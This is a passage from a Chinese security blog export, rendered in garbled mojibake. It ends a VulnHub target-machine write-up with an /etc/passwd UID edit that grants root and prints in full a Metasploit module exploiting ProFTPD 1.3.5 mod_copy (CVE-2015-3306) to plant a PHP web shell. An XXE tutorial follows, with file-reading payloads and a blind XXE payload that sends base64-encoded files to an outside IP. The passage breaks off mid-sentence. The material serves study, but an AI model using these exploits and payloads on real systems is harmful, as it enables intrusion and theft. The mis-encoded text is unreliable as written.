/etc/passwdï¼Œä¸Šé¢è¿™ä¸ªå‘½ä»¤è¡¨ç¤ºä¿®æ”¹/etc/passwdæ–‡ä»¶ä¸­çš„ç¬¬36è¡Œï¼ŒæŠŠ1000:1000æ›¿æ¢æˆ0:0 é‡æ–°ç™»å½•ä¸€ä¸‹å°±å¯ä»¥è·å¾—rootæƒé™äº†ï¼š 0x04 ProFTP 1.3.5 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148### This module requires Metasploit: http://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;msf/core&#x27;class Metasploit3 &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::Tcp include Msf::Exploit::Remote::HttpClient def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;ProFTPD 1.3.5 Mod_Copy Command Execution&#x27;, &#x27;Description&#x27; =&gt; %q&#123; This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the &#x27;nobody&#x27; user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible. &#125;, &#x27;Author&#x27; =&gt; [ &#x27;Vadim Melihow&#x27;, # Original discovery, Proof of Concept &#x27;xistence &lt;xistence[at]0x90.nl&gt;&#x27; # Metasploit module ], &#x27;License&#x27; =&gt; MSF_LICENSE, &#x27;References&#x27; =&gt; [ [ &#x27;CVE&#x27;, &#x27;2015-3306&#x27; ], [ &#x27;EDB&#x27;, &#x27;36742&#x27; ] ], &#x27;Privileged&#x27; =&gt; false, &#x27;Platform&#x27; =&gt; [ &#x27;unix&#x27; ], &#x27;Arch&#x27; =&gt; ARCH_CMD, &#x27;Payload&#x27; =&gt; &#123; &#x27;BadChars&#x27; =&gt; &#x27;&#x27;, &#x27;Compat&#x27; =&gt; &#123; &#x27;PayloadType&#x27; =&gt; &#x27;cmd&#x27;, &#x27;RequiredCmd&#x27; =&gt; &#x27;generic gawk bash python perl&#x27; &#125; &#125;, &#x27;Targets&#x27; =&gt; [ [ &#x27;ProFTPD 1.3.5&#x27;, &#123; &#125; ] ], &#x27;DisclosureDate&#x27; =&gt; &#x27;Apr 22 2015&#x27;, &#x27;DefaultTarget&#x27; =&gt; 0)) register_options( [ OptPort.new(&#x27;RPORT&#x27;, [true, &#x27;HTTP port&#x27;, 80]), OptPort.new(&#x27;RPORT_FTP&#x27;, [true, &#x27;FTP port&#x27;, 21]), OptString.new(&#x27;TARGETURI&#x27;, [true, &#x27;Base path to the website&#x27;, &#x27;/&#x27;]), OptString.new(&#x27;TMPPATH&#x27;, [true, &#x27;Absolute writable path&#x27;, &#x27;/tmp&#x27;]), OptString.new(&#x27;SITEPATH&#x27;, [true, &#x27;Absolute writable website path&#x27;, &#x27;/var/www&#x27;]) ], self.class) end def check ftp_port = datastore[&#x27;RPORT_FTP&#x27;] sock = Rex::Socket.create_tcp(&#x27;PeerHost&#x27; =&gt; rhost, &#x27;PeerPort&#x27; =&gt; ftp_port) if sock.nil? fail_with(Failure::Unreachable, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;) else print_status(&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;) end res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;220&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;) end sock.puts(&quot;SITE CPFR /etc/passwd\\r\\n&quot;) res = sock.get_once(-1, 10) if res &amp;&amp; res.include?(&#x27;350&#x27;) Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end end def exploit ftp_port = datastore[&#x27;RPORT_FTP&#x27;] get_arg = rand_text_alphanumeric(5+rand(3)) payload_name = rand_text_alphanumeric(5+rand(3)) + &#x27;.php&#x27; sock = Rex::Socket.create_tcp(&#x27;PeerHost&#x27; =&gt; rhost, &#x27;PeerPort&#x27; =&gt; ftp_port) if sock.nil? fail_with(Failure::Unreachable, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;) else print_status(&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;) end res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;220&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;) end print_status(&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Sending copy commands to FTP server&quot;) sock.puts(&quot;SITE CPFR /proc/self/cmdline\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;350&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from /proc/self/cmdline&quot;) end sock.put(&quot;SITE CPTO #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru($_GET[\\&#x27;#&#123;get_arg&#125;\\&#x27;]);?&gt;\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;250&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying to temporary payload file&quot;) end sock.put(&quot;SITE CPFR #&#123;datastore[&#x27;TMPPATH&#x27;]&#125;/.&lt;?php passthru($_GET[\\&#x27;#&#123;get_arg&#125;\\&#x27;]);?&gt;\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;350&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying from temporary payload file&quot;) end sock.put(&quot;SITE CPTO #&#123;datastore[&#x27;SITEPATH&#x27;]&#125;/#&#123;payload_name&#125;\\r\\n&quot;) res = sock.get_once(-1, 10) unless res &amp;&amp; res.include?(&#x27;250&#x27;) fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure copying PHP payload to website path, directory not writable?&quot;) end sock.close print_status(&quot;#&#123;peer&#125; - Executing PHP payload #&#123;target_uri.path&#125;#&#123;payload_name&#125;&quot;) res = send_request_cgi!( &#x27;uri&#x27; =&gt; normalize_uri(target_uri.path, payload_name), &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;vars_get&#x27; =&gt; &#123; get_arg =&gt; &quot;nohup #&#123;payload.encoded&#125; &amp;&quot; &#125; ) unless res &amp;&amp; res.code == 200 fail_with(Failure::Unknown, &quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure executing payload&quot;) end endend","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"é¶æœº/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹XXEæ¼æ´åˆ©ç”¨","date":"2020-02-26T09:42:56.000Z","path":"Web_security/basic_learning/20.xxeæ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹XXEæ¼æ´åˆ©ç”¨ ä»€ä¹ˆæ˜¯XXE XXEï¼šXML External Entity å³å¤–éƒ¨å®ä½“ï¼Œä»å®‰å…¨è§’åº¦ç†è§£æˆXML External Entity attack å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼ˆé‚£ä¸ºå•¥ä¸å«XEEï¼‰ã€‚å¯¹äº XXE æƒ³è¦çœŸæ­£çš„äº†è§£å®ƒï¼Œå°±éœ€è¦å…ˆæ¥äº†è§£ä¸€ä¸‹XMLæ˜¯ä»€ä¹ˆã€‚ XMLï¼ˆExtensible Markup Languageï¼‰è‹±æ–‡ç›´è¯‘å°±æ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œâ€œæ ‡è®°â€ æ˜¯æŒ‡è®¡ç®—æœºæ‰€èƒ½ç†è§£çš„ä¿¡æ¯ç¬¦å·ï¼Œé€šè¿‡æ­¤ç§æ ‡è®°ï¼Œè®¡ç®—æœºä¹‹é—´å¯ä»¥å¤„ç†åŒ…å«å„ç§ä¿¡æ¯çš„æ–‡ç« ç­‰ã€‚ å¦‚æœæŠŠ HTML å’Œ XML è¿›è¡Œå¯¹æ¯”çš„è¯ï¼Œ HTML æ—¨åœ¨æ˜¾ç¤ºæ•°æ®ä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“æ•°æ®ä¿¡æ¯ã€‚ï¼ˆè¯´åˆ°ä¼ è¾“æ•°æ®è‡ªç„¶è€Œç„¶è‚¯å®šä¼šæƒ³åˆ°jsonæ ¼å¼ï¼Œç›¸æ¯”XMLï¼Œç°åœ¨ç”¨çš„æ›´å¤šæ˜¯jsonæ ¼å¼æ¥ä¼ è¾“æ•°æ®ï¼‰ XMLåŸºæœ¬çŸ¥è¯† 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;ca01h&lt;/to&gt;&lt;from&gt;njupt&lt;/from&gt;xml&lt;/note&gt; åœ¨ä¸Šé¢ä»£ç ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå®šä¹‰XMLçš„ç‰ˆæœ¬ä¸ç¼–ç ã€‚ åœ¨XMLæ–‡æ¡£ä¸­ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½å¿…é¡»æ­£ç¡®çš„åµŒå¥—ï¼Œå½¢æˆæ ‘å½¢ç»“æ„ã€‚å¹¶ä¸”æ•´ä¸ªXMLæ–‡æ¡£ä¸­å¿…é¡»è¦æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ã€‚å¦‚ä¸Šä»£ç ï¼Œ&lt;note&gt;æ˜¯æ•´ä¸ªæ–‡æ¡£çš„æ ¹å…ƒç´ ã€‚åµŒå¥—åœ¨noteæ ‡ç­¾ä¸­çš„&lt;to&gt;å’Œ&lt;from&gt;åˆ™æ˜¯æ ¹çš„å­å…ƒç´ ã€‚ åŒæ—¶ï¼Œæ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰å…³é—­æ ‡ç­¾ï¼Œè¿™ç‚¹ä¸åƒhtmlè¯­æ³•é‚£æ ·æ¾æ•£ã€‚å¦‚æœç¼ºå¤±å…³é—­æ ‡ç­¾ï¼Œåˆ™ä¼šå¯¼è‡´XMLè§£æå¤±è´¥ã€‚ å®ä½“ æ‰€æœ‰çš„XMLæ–‡æ¡£éƒ½ç”±äº”ç§ç®€å•çš„æ„å»ºæ¨¡å—ï¼ˆå…ƒç´ ï¼Œå±æ€§ï¼Œå®ä½“ï¼ŒPCDATA CDATAï¼‰æ„æˆã€‚è¿™é‡Œç€é‡ä»‹ç»ä¸€ä¸‹å®ä½“ï¼šå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚å› æ­¤æˆ‘ä»¬åˆ©ç”¨å¼•å…¥å®ä½“ï¼Œæ„é€ æ¶æ„å†…å®¹ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ å®ä½“æ€»å…±æœ‰å››ç§ï¼Œåˆ†åˆ«æ˜¯ï¼š å†…ç½®å®ä½“ (Built-in entities) å­—ç¬¦å®ä½“ (Character entities) é€šç”¨å®ä½“ (General entities) å‚æ•°å®ä½“ (Parameter entities) å…¶ä¸­å†…ç½®å®ä½“å’Œå­—ç¬¦å®ä½“éƒ½å’Œ HTML çš„å®ä½“ç¼–ç ç±»ä¼¼ï¼Œä½†å¦‚æœä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“å®Œå…¨å¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼šé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ã€‚ DTD XMLçš„è¯­è¨€è§„èŒƒæ˜¯ç”±DTDï¼ˆDocument Type Definitionï¼‰æ¥æ§åˆ¶ï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€çš„è¯­æ³•ï¼Œå®ƒå®šä¹‰äº†XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå³å£°æ˜äº†XMLçš„å†…å®¹æ ¼å¼è§„èŒƒã€‚ DTD çš„å£°æ˜æ–¹å¼åˆ†ä¸ºä¸¤ç§ï¼šå†…éƒ¨ DTD å’Œå¤–éƒ¨ DTD ï¼Œå…¶åŒºåˆ«å°±åœ¨äºï¼šå¯¹ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„ DTD çš„å£°æ˜æ˜¯åœ¨ XML æ–‡æ¡£å†…éƒ¨å¼•ç”¨è¿˜æ˜¯å¼•ç”¨å¤–éƒ¨çš„ dtd æ–‡ä»¶ã€‚ å†…éƒ¨å¼•ç”¨ ä¸‹é¢æ˜¯ä¸€ä¸ªå†…éƒ¨DTDçš„XMLç¤ºä¾‹ï¼š 123456789101112&lt;!--XMLå£°æ˜--&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!--DTDï¼Œæ–‡æ¡£ç±»å‹å£°æ˜--&gt;&lt;!DOCTYPE note [ #å®šä¹‰æ­¤æ–‡æ¡£æ˜¯noteç±»å‹&lt;!ELEMENT note (body)&gt; #å®šä¹‰noteå…ƒç´ æœ‰ä¸€ä¸ªå…ƒç´ ï¼š&quot;body&quot;&lt;!ELEMENT body (#PCDATA)&gt; #å®šä¹‰bodyå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹&lt;!ENTITY writer &quot;hello world&quot;&gt; #å®šä¹‰ä¸€ä¸ªå†…éƒ¨å®ä½“]&gt;&lt;!--æ–‡æ¡£å…ƒç´ --&gt; &lt;note&gt;&lt;body&gt;&amp;writer;&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; ä¸Šé¢ç¬¬7è¡Œå®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨å®ä½“ï¼Œç¬¬11è¡Œä¸­å¯¹ä¸Šé¢å®šä¹‰çš„writerå®ä½“è¿›è¡Œäº†å¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºçš„æ—¶å€™&amp;writerå°±ä¼šè¢«&quot;hello world&quot;æ›¿æ¢ã€‚ 1&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ:&amp;ç¬¦å·, å®ä½“åç§°, åˆ†å· (ğŸ˜‰ï¼Œè¿™é‡Œ&amp;ä¸è®ºåœ¨GETè¿˜æ˜¯åœ¨POSTä¸­éƒ½éœ€è¦è¿›è¡ŒURLç¼–ç ï¼Œå› ä¸ºæ˜¯ä½¿ç”¨å‚æ•°ä¼ å…¥xmlçš„ï¼Œ&amp;ç¬¦å·ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°é—´çš„è¿æ¥ç¬¦å· å¤–éƒ¨å¼•ç”¨ é€šç”¨å®ä½“ ä¸‹é¢å†æ¥çœ‹çœ‹ä¸€ä¸ªå¤–éƒ¨DTDçš„XMLç¤ºä¾‹ï¼š 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt; #å®šä¹‰å…ƒç´ ä¸ºANYï¼Œå³å¯ä»¥æ¥å—ä»»ä½•å…ƒç´ ã€‚&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;&lt;root&gt;&lt;body&gt;&amp;xxe;&lt;&#x2F;body&gt; #å®šä¹‰ä¸€ä¸ªå¤–éƒ¨å®ä½“&lt;&#x2F;root&gt; é€šè¿‡ç¬¬ 4 è¡Œçš„å®šä¹‰ï¼Œ ç¬¬ 7 è¡Œçš„ &amp;xxe å°±ä¼šå¯¹ c:/test.dtd æ–‡ä»¶èµ„æºè¿›è¡Œ SYSTEM å…³é”®å­—çš„å¼•ç”¨ï¼Œè¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°ã€‚ å¦å¤–é™¤äº†ä¸Šé¢ SYSTEM å…³é”®å­—çš„å¼•ç”¨æ–¹å¼ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ PUBLIC å¼•ç”¨å…¬ç”¨ DTD çš„æ–¹å¼ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š 1&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt; è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨ï¼Œä½†å®é™…ä¸Šå®ä½“è¿œä¸æ­¢è¿™ä¸€ç§ï¼Œæˆ‘ä»¬ä»¥ä¸Šæ¶‰åŠçš„å®ä½“åªæ˜¯å…¶ä¸­çš„ä¸€ç§ï¼Œè¢«ç§°ä¸ºé€šç”¨å®ä½“ã€‚ å‚æ•°å®ä½“ 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt;%an-element; %remote-dtd; åœ¨ä¸Šé¢çš„ä»£ç ç¤ºä¾‹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å®ä½“åå‰å¤šäº†ä¸€ä¸ª â€œ%â€ ï¼Œåœ¨å‚æ•°å®ä½“ä¸­ä½¿ç”¨ â€œ% å®ä½“åâ€ (è¿™é‡Œé¢çš„ç©ºæ ¼ä¸èƒ½å°‘) å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ â€œ% å®ä½“åâ€ å¼•ç”¨ã€‚ å¦å¤–å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ï¼ŒåŒæ—¶åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“ã€‚ XMLæ³¨å…¥ ä¸‹é¢æ˜¯ä¸€ä¸ªæ™®é€šçš„XMLæ³¨å…¥ä¾‹å­ï¼š 123# æ³¨å…¥å‰XMLä»£ç &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;ç”¨æˆ·è¾“å…¥ä½ç½®&lt;&#x2F;USER&gt; å½“ç”¨æˆ·è¾“å…¥ä¸€äº›æ¶æ„ä»£ç ï¼Œæ¯”å¦‚User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2ï¼ŒåŸXMLä»£ç å°±å˜æˆäº†ä¸‹é¢çš„æ ·å­ï¼š 1234# æ³¨å…¥åXMLä»£ç &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt; å¯ä»¥çœ‹åˆ°é€šè¿‡XMLè¯­å¥çš„å‰åæ‹¼æ¥ï¼Œ XMLä»£ç è¢«æ’å…¥äº†è¿›å»ã€‚ å¯¹æ™®é€šçš„ XML æ³¨å…¥ï¼Œåˆ©ç”¨é¢æ¯”è¾ƒç‹­çª„ï¼Œç°å®ä¸­ä¹Ÿæ˜¯æ¯”è¾ƒé¸¡è‚‹çš„å­˜åœ¨ï¼Œå› æ­¤å‡ ä¹ç”¨ä¸åˆ°ï¼Œå¦‚æœæœ‰çš„è¯åº”è¯¥ä¹Ÿæ˜¯é€»è¾‘æ¼æ´ï¼Œä¸‹é¢å°±é‡ç‚¹ä»‹ç»XXEçš„åˆ©ç”¨ã€‚ XXEåˆ©ç”¨ å®éªŒç¯å¢ƒ ç›®æ ‡é¶æœºï¼š IPï¼š192.168.0.104 ç¯å¢ƒï¼šWin7+phpStudy+apache+php æœ¬åœ°ä¸»æœºï¼š IPï¼š192.168.0.108 ç¯å¢ƒï¼šWin10+phpStudy+apache+BurpSuite+Python3 æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆNormal XXEï¼‰ ç›®æ ‡é¶æœºï¼šxxe_test.php 1234567&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; åœ¨Cç›˜ä¸‹æ–°å»ºä¸€ä¸ªflag.txtï¼Œå†…å®¹æˆ‘è®¾ç½®æˆäº†XXE Payload Executed Successfully!!!ã€‚ æœ¬åœ°ä¸»æœºï¼špayload 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [&lt;!ENTITY goodies SYSTEM &quot;file:///c:/flag.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt; å¦‚æœflag.txtä¸­åŒ…å«ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚&lt;&gt;&amp;&quot;'ç­‰ï¼Œä¾‹å¦‚ï¼š 1&lt;XXE Payload Executed Successfully!!!&gt; å¯ä»¥çœ‹åˆ°å½“è¢«è¯»å–æ–‡ä»¶ä¸­å«æœ‰ç‰¹æ®Šç¬¦å·æ—¶ï¼Œè¿”å›äº†ä¸€å †é”™è¯¯ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨CDATAäº†ã€‚ï¼ˆå½“ç„¶ï¼Œæ›´ç®€å•çš„ä½¿ç”¨base64ç¼–ç ï¼‰ ä»€ä¹ˆæ˜¯CDATAï¼š CDATAï¼Œæ„ä¸ºcharacter dataï¼Œæ˜¯æ ‡è®°è¯­è¨€SGMLä¸XMLï¼Œè¡¨ç¤ºæ–‡æ¡£çš„ç‰¹å®šéƒ¨åˆ†æ˜¯æ™®é€šçš„å­—ç¬¦æ•°æ®ï¼Œè€Œä¸æ˜¯éå­—ç¬¦æ•°æ®æˆ–æœ‰ç‰¹å®šã€é™å®šç»“æ„çš„å­—ç¬¦æ•°æ®ã€‚åœ¨XMLæ–‡æ¡£æˆ–å¤–éƒ¨å®ä½“ä¸­ï¼Œä¸€ä¸ªCDATA sectionæ˜¯ä¸€æ®µæŒ‰å­—é¢è§£é‡Šçš„å†…å®¹ï¼Œä¸ä½œä¸ºæ ‡è®°æ–‡æœ¬ã€‚å­—ç¬¦ç”¨CDATAèŠ‚è¡¨ç¤ºæˆ–è€…æŒ‰ç…§æ ‡å‡†è¯­æ³•è¡¨ç¤ºï¼Œå¹¶æ— å·®å¼‚ã€‚ CDATA éƒ¨åˆ†ç”±&quot;&lt;![CDATA[&quot;å¼€å§‹ï¼Œç”±&quot;]]&gt;&quot;ç»“æŸ ç®€å•ä¸€ç‚¹çš„æ¥è¯´ï¼Œå°†è„šæœ¬ä»£ç å®šä¹‰ä¸ºCDATAåï¼ŒCDATAéƒ¨åˆ†ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æå™¨å¿½ç•¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ã€‚ æœ¬åœ°ä¸»æœºï¼šCDATA Payload 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt; æœ¬åœ°ä¸»æœºï¼ševil.dtd 12&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; åˆ©ç”¨å¸¦æœ‰CDATAçš„Payloadï¼Œå¯ä»¥çœ‹åˆ°ç‰¹æ®Šç¬¦å·è¢«æˆåŠŸç»•è¿‡ã€‚ ä½†æ˜¯åœ¨çœŸå®æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¸Šçš„XMLä¸€èˆ¬ç”¨äºé…ç½®æ–‡ä»¶æˆ–è€…ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ï¼Œå› æ­¤åœ¨ç°å®ç¯å¢ƒä¸‹åˆ©ç”¨è¿™ä¸ªæ¼æ´å°±éœ€è¦æ‰¾åˆ°ä¸ä¾é å›æ˜¾çš„æ–¹æ³•ã€‚ æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆBlind XEEï¼‰ payload1 ç›®æ ‡é¶æœºï¼šxxe_blind_test.php 123456&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);?&gt; æœ¬åœ°ä¸»æœºï¼šPayload 1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt;%remote;%int;%send;]&gt; æœ¬åœ°ä¸»æœºï¼ševil.dtd 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.97.199.89:9999?p&#x3D;%file;&#39;&gt;&quot;&gt; ç»“æœå¦‚ä¸‹ï¼š çœ‹åˆ°æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°äº†æˆ‘ä»¬ç”¨ base64 ç¼–ç åçš„æ•æ„Ÿæ–‡ä»¶ä¿¡æ¯(ç¼–ç ä¹Ÿæ˜¯ä¸ºäº†ä¸ç ´ååŸæœ¬çš„XMLè¯­æ³•ï¼Œä¸ç¼–ç ä¼šæŠ¥é”™ï¼‰ã€‚ ç›®æ ‡é¶æœºçš„ç½‘ç»œå‡ºäº†ç‚¹é—®é¢˜ï¼ŒIPåœ°å€æ¢æˆäº†192.168.50.130 ç°åœ¨æˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹Payloadçš„è°ƒç”¨è¿‡ç¨‹ï¼š è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ %remote;%int;%send;ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ evil.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå°† evil.dtd åŒ…å«è¿›æ¥ï¼Œç„¶å %int è°ƒç”¨ evil.dtd ä¸­çš„ %file, %file å°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ° %send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  &amp;#37;)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œè¿™æ 